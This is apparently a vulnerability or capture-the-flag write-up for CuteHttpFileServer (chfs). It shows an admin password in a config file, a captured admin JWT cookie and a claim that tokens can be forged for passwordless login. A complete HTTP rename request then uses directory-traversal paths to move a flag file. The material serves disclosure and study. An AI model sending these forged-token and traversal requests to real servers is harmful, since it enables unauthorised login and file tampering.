Offical  website address:[http://iscute.cn/chfs](http://iscute.cn/chfs)
Offical github website address：[https://github.com/ods-im/CuteHttpFileServer](https://github.com/ods-im/CuteHttpFileServer)
# KEY
**JWT,Directory traversal**
# Environment preparation 
## Download chfs.exe
Enter Offical  website address:[http://iscute.cn/chfs](http://iscute.cn/chfs) Select chfs-3.1-windows
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1709274988874-51126c62-5bc7-45a7-acca-1eb3903631eb.png#averageHue=%23fefcfc&clientId=u1a104c01-cf31-4&from=paste&height=494&id=u87c18b23&originHeight=618&originWidth=1011&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61883&status=done&style=none&taskId=u71255b8b-bf79-46df-834b-12bf17c16ff&title=&width=808.8)

## Download the .ini file
![7f57f3ad6839150f7a8fe81f61171fd.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1709275034578-b083f182-64cf-458e-949f-7d1f51656e9f.png#averageHue=%23b4b1b0&clientId=u1a104c01-cf31-4&from=paste&height=629&id=uc2c33651&originHeight=786&originWidth=1026&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64249&status=done&style=none&taskId=u77fa3f35-6b87-44f8-b446-39b8f45f7ca&title=&width=820.8)
## configure .ini file
1.Powerusername: admin; 
2.The password is gdgm.edu.cn@M1n9K1n
3.Grant the corresponding rw permissions to the admin user,then Read-only permissions for common users
```php
#---------------------------------------
# 请注意：
#     1，如果不存在键或对应值为空，则不影响对应的配置
#     2，配置项的值，语法如同其对应的命令行参数
#   //共享目录为D盘，监听端口号为8080
#    chfs --path="d:/" --port=8080
#  //通过配置文件进行配置，该文件可以不存在，待以后需要更改配置时使用
#   chfs --file="./cfg.ini"
#---------------------------------------

# 监听端口
port=8000
path=/home/ming/share_main/


[admin]
password=gdgm.edu.cn@M1n9K1n
rule.default=rw
rule.r=
rule.w=

[guest]
rule.default=r
rule.r=

# 用户操作日志存放目录，默认为空
# 如果赋值为空，表示禁用日志
log=

# 下载目录策略。disable:禁用; leaf:仅限叶子目录的下载; enable或其他值:不进行限制。
# 默认值为 enable
folder.download=

#-------------- 设置生效后启用HTTPS，注意监听端口设置为443-------------
# 指定certificate文件
ssl.cert=
# 指定private key文件
ssl.key=
# 设置会话的生命周期，单位：分钟，默认为30分钟
session.timeout=

```
# Get the admin cookie
Enter the passwd corresponding to admin according to the configuration file above,then locally login
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1708271514845-669c227a-d9ca-4c13-8fc2-691b73bd6b61.png#averageHue=%23ededed&clientId=u0db1e2ac-21a8-4&from=paste&height=264&id=ua53c55e5&originHeight=318&originWidth=398&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=13015&status=done&style=none&taskId=ufa080c9c-30e3-482c-b083-9f3fbe7fe74&title=&width=330.3999938964844)
**and obtain their cookies after login successfully**
:::tips
GET / HTTP/1.1
Host: 172.30.43.159:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2MiOiJhZG1pbiIsImV4cCI6MTcwOTI3NzkzMH0.YdYxdkX_VBtnsWoaMQTMK6tr63NTWh5l3rU1q27hvwY; user=admin
Upgrade-Insecure-Requests: 1
:::
#  JWT Decryption and Forgery 
**Note: .ini session in the configuration file is 30 minutes by default. Therefore, any JWT has to be obtained in the local environment, which cannot be provided herea**
JWT decryption, the payload only contains the admin user we just registered, without verifying the current user's password. At the same time, the symmetric key has also been decrypted. From then on, any identity login can be achieved using JWT
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1708265286149-01a5430e-c13f-483c-b504-1b2b428e353b.png#averageHue=%23fcfcfc&clientId=u0db1e2ac-21a8-4&from=paste&height=488&id=ud680d0e1&originHeight=610&originWidth=1457&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61397&status=done&style=none&taskId=u94e2e8bd-1c83-4042-b6b9-de21a0f7ef9&title=&width=1165.6)
# Experimental effect 
Now we are trying not to use a password, but to use our forged JWT to achieve login
## before login
### first
If you are not logged in admin, you only have the permission to download, but not the permission to rename or delete
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1709275831227-0cff88fe-8b2d-4bb6-bf38-c77dc6e61178.png#averageHue=%23f7f7f7&clientId=u1a104c01-cf31-4&from=paste&height=428&id=u5cb337c7&originHeight=535&originWidth=1232&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45156&status=done&style=none&taskId=u3b7f4cd8-50f3-4a5c-a905-03fb4f08017&title=&width=985.6)
### second
Passwordless login is achieved by using the JWT obtained before
![48fdef1fe92ab34f940ed91bf5a66b7.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1709276693927-fa5d3d4a-8c96-4d96-a8f0-dd50c030812f.png#averageHue=%23dabc94&clientId=u1a104c01-cf31-4&from=paste&height=416&id=u4c7fb99c&originHeight=520&originWidth=1290&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=57544&status=done&style=none&taskId=uc10486b1-9237-407e-8f36-5d800f13a9e&title=&width=1032)
## successful jwt  forgery
Pressing F5 to refresh the browser, it was observed that the administrator user has logged in successfully without needing a password. Hence, we can utilize the same method to log in as any identity, while also gaining elevated privileges, including the ability to rename and delete.
![image.png](https://cdn.nlark.com/yuque/0/2024/png/39233950/1709277093002-62b040f0-9b9a-4751-bcfc-7b426351cc85.png#averageHue=%23f0eceb&clientId=u1a104c01-cf31-4&from=paste&height=461&id=u0e0b97cf&originHeight=576&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96243&status=done&style=none&taskId=u0cdf3d79-468a-431b-856b-b7df9c8be6b&title=&width=1536)
# 
Further exploit
After logging in as the admin user, you gain the ability to rename files. Combining this with a historical vulnerability in URL directory traversal, you can move any file from one location to another. For instance, moving /flag/flag/flag.txt to the default working directory /home/ming/share_main.
:::tips
POST /chfs/rename HTTP/1.1
Host: 172.17.0.3:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
cache-control: no-cache
Content-Type: multipart/form-data; boundary=---------------------------387492560430303528193503395152
Content-Length: 377
Origin: [http://172.17.0.3:8000](http://172.17.0.3:8000)
Connection: close
Referer: [http://172.17.0.3:8000/](http://172.17.0.3:8000/)
Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2MiOiJhZG1pbiIsImV4cCI6MTcwOTI3Mjc3OH0.oXGZf37LrABxC01z05W-Z_imorz59LFapLI0bL8GJtc; {9c2028b6-2cb2-4ff5-bf33-e17126a2eeba}=value; user=admin

-----------------------------387492560430303528193503395152
Content-Disposition: form-data; name="new"

..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fming%2Fshare_main%2Fflag.txt
-----------------------------387492560430303528193503395152
Content-Disposition: form-data; name="old"

/../../../../flag/flag/flag.txt
-----------------------------387492560430303528193503395152--

:::

# Summary
:::info
The product allows forged JWTs, resulting in arbitrary login without a password and inheriting the user's permissions, which may trigger a directory vulnerability and ultimately invalidate the product's functionality

:::
